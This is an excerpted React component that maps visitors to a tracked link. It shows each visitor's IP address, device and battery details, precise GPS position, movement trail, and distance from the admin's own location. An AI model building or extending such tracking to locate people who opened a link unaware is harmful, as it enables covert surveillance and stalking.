...
export const LinkDetailMap: React.FC<{ coordinates: LinkVisitorPin[] }> = ({ coordinates }) => {
  ...
  const [adminLoc, setAdminLoc] = useState<{ lat: number; lng: number; acc?: number } | null>(null), [selectedIdx, setSelectedIdx] = useState(0), [mapMode, setMapMode] = useState<MapMode>("streets");
  const { theme } = useTheme(), valid = coordinates.filter((c) => Math.abs(c.latitude) > 0.001 && Math.abs(c.longitude) > 0.001), selectedPin = valid[selectedIdx] || valid[0] || null;
  ...
  useEffect(() => {
    ...
    return fetchAdminCoordinates((c) => setAdminLoc(c));
  }, []);
  ...
  const renderMarkers = (L: any, map: any, layer: any, items: LinkVisitorPin[], aLoc: typeof adminLoc, activeIdx: number) => {
    ...
    // Group updates by visitor session to prevent overlapping pin storms
    const groups: { [key: string]: LinkVisitorPin[] } = {};
    items.forEach((c) => {
      const key = c.sessionId || c.ipAddress || "visitor";
      if (!groups[key]) groups[key] = [];
      groups[key].push(c);
    });

    const vKeys = Object.keys(groups);
    vKeys.forEach((key, vIdx) => {
      const list = groups[key].sort((a, b) => (a.timestamp ? new Date(a.timestamp).getTime() : 0) - (b.timestamp ? new Date(b.timestamp).getTime() : 0));
      const latest = list[list.length - 1];
      const pos: [number, number] = [latest.latitude, latest.longitude];
      bounds.push(pos);

      // Render historical movement trail if moved > 30m
      if (list.length > 1) {
        const trail: [number, number][] = [];
        for (const p of list) {
          if (!trail.length || calculateDistanceMeters(trail[trail.length - 1][0], trail[trail.length - 1][1], p.latitude, p.longitude) >= 30) trail.push([p.latitude, p.longitude]);
        }
        if (trail.length > 1) {
          L.polyline(trail, { color: "#FFFC00", weight: 2.5, opacity: 0.8, dashArray: "5, 6" }).addTo(layer);
          trail.slice(0, -1).forEach(([lat, lng]) => L.circleMarker([lat, lng], { radius: 3, color: "#000", fillColor: "#FFFC00", fillOpacity: 0.8, weight: 1 }).addTo(layer));
        }
      }

      // Rule 07: Single Primary Snapchat Ghost Marker per visitor
      const marker = L.marker(pos, { icon: createSnapGhostIcon(L, 38), zIndexOffset: vIdx === activeIdx ? 2000 : 1000 }).addTo(layer);
      if (vIdx === activeIdx && latest.accuracy) {
        createSnapAccuracyCircle(L, pos, latest.accuracy).addTo(layer);
      }

      const gmaps = `https://www.google.com/maps?q=${latest.latitude},${latest.longitude}`;
      const dev = [latest.deviceInfo?.os, latest.deviceInfo?.browser, latest.deviceInfo?.battery !== undefined ? `${latest.deviceInfo.battery}%` : null].filter(Boolean).join(" • ");
      const dAdm = aLoc ? formatDistance(calculateDistanceMeters(aLoc.lat, aLoc.lng, latest.latitude, latest.longitude), latest.accuracy, aLoc.acc) : null;
      marker.on("click", () => setSelectedIdx(vIdx));
      marker.bindPopup(`<div style="color:#000;font-family:sans-serif;padding:4px;min-width:170px;"><strong style="font-size:13px;display:block;">Visitor #${vIdx + 1}</strong>${latest.ipAddress ? `<span style="font-size:11px;color:#333;display:block;">IP: <b>${latest.ipAddress}</b></span>` : ""}${dev ? `<span style="font-size:11px;color:#555;display:block;">${dev}</span>` : ""}<span style="font-size:11px;color:#555;display:block;">${latest.latitude.toFixed(4)}, ${latest.longitude.toFixed(4)} &bull; ±${Math.round(latest.accuracy || 0)}m</span>${dAdm ? `<div style="margin:3px 0;font-size:11px;color:#1a73e8;font-weight:bold;">📏 Admin: ${dAdm}</div>` : ""}<a href="${gmaps}" target="_blank" rel="noopener noreferrer" style="display:inline-block;font-size:11px;background:#000;color:#FFFC00;padding:4px 8px;border-radius:6px;text-decoration:none;font-weight:bold;margin-top:4px;">Open in Google Maps &rarr;</a></div>`);
    });
    ...
    if (aLoc) {
      ...
      aMarker.bindPopup(`<div style="color:#000;font-family:sans-serif;font-size:12px;padding:4px;"><strong style="font-size:13px;display:block;">📍 Admin Location (You)</strong><span style="color:#555;">GPS Acc: ±${Math.round(aLoc.acc || 0)}m</span></div>`);
      if (active && dM > Math.min(Math.max(25, ((active?.accuracy || 0) + (aLoc.acc || 0))), 150)) {
        L.polyline([[aLoc.lat, aLoc.lng], [active.latitude, active.longitude]], { color: "#1a73e8", weight: 2.5, opacity: 0.9, dashArray: "6, 6" }).addTo(layer);
      }
    }
  ...
  useEffect(() => {
    ...
    import("leaflet").then((m) => { if (mapInst.current) tileRef.current = m.default.tileLayer(cfg.url, cfg.options).addTo(mapInst.current); });
  }, [mapMode, theme]);
  ...
  const vCount = new Set(valid.map(v => v.sessionId || v.ipAddress)).size;
    ...
    <div className="relative w-full h-[470px] rounded-3xl overflow-hidden border border-white/10 shadow-2xl bg-[#0B0B0E] snap-map-overlay" data-map-overlay="true">
      ...
      <div className="absolute top-2 left-2 right-2 z-10 flex items-center justify-between pointer-events-none gap-1">
        <div className="flex items-center gap-1 flex-wrap max-w-[calc(100%-110px)]">
          <div className="pointer-events-auto h-6 flex items-center gap-1 px-2 rounded-md bg-[#0B0B0E]/90 backdrop-blur-md border border-white/10 shadow-sm">
            ...
            <span className="text-[10px] font-bold text-white whitespace-nowrap">{vCount} {vCount === 1 ? "Visitor" : "Visitors"}</span>
          </div>
          {adminLoc && (
      ...
      <div className="absolute bottom-2 right-2.5 z-10 flex flex-col items-center gap-1.5">
        <div className="flex flex-col rounded-xl overflow-hidden bg-[#0B0B0E]/90 backdrop-blur-xl border border-white/15 shadow-xl">
          <button onClick={() => mapInst.current?.zoomIn()} className="w-8 h-6 flex items-center justify-center text-white/80 hover:text-white hover:bg-white/10 active:scale-95 text-xs font-bold border-b border-white/10">+</button>
          <button onClick={() => mapInst.current?.zoomOut()} className="w-8 h-6 flex items-center justify-center text-white/80 hover:text-white hover:bg-white/10 active:scale-95 text-xs font-bold">&minus;</button>
        </div>
        <button onClick={handleRecenter} className="w-8 h-8 rounded-xl bg-[#0B0B0E]/90 hover:bg-black backdrop-blur-xl border border-white/15 text-[#FFFC00] shadow-xl active:scale-90 flex items-center justify-center group" title="Re-center map">
      ...
      {selectedPin ? (
        <div className="absolute bottom-2 left-2 z-10 w-[calc(100%-54px)] sm:w-auto sm:max-w-xs bg-[#0B0B0E]/95 backdrop-blur-xl border border-white/10 rounded-xl p-2 shadow-2xl space-y-1.5">
          <div className="flex items-center justify-between gap-1.5">
            ...
            <a href={`https://www.google.com/maps?q=${selectedPin.latitude},${selectedPin.longitude}`} target="_blank" rel="noopener noreferrer" className="h-6 px-2 rounded-md bg-[#FFFC00] hover:bg-[#FFFC00]/90 text-black font-black text-[10px] shrink-0 transition-all active:scale-95 shadow-sm flex items-center gap-1">
              <Navigation className="w-2.5 h-2.5 text-black" /><span>Maps</span><ExternalLink className="w-2.5 h-2.5 text-black/60" />
            </a>
          </div>
          {currentDist && (
            <button onClick={handleRecenter} className="w-full h-5 flex items-center justify-between gap-1 px-2 rounded-md bg-blue-500/15 hover:bg-blue-500/25 border border-blue-500/25 text-blue-300 text-[10px] font-medium leading-none transition-all active:scale-[0.99]">
              <span className="flex items-center gap-1 truncate"><Compass className="w-2.5 h-2.5 text-blue-400 shrink-0" /><span className="truncate">Admin ➔ Visitor: {currentDist}</span></span>
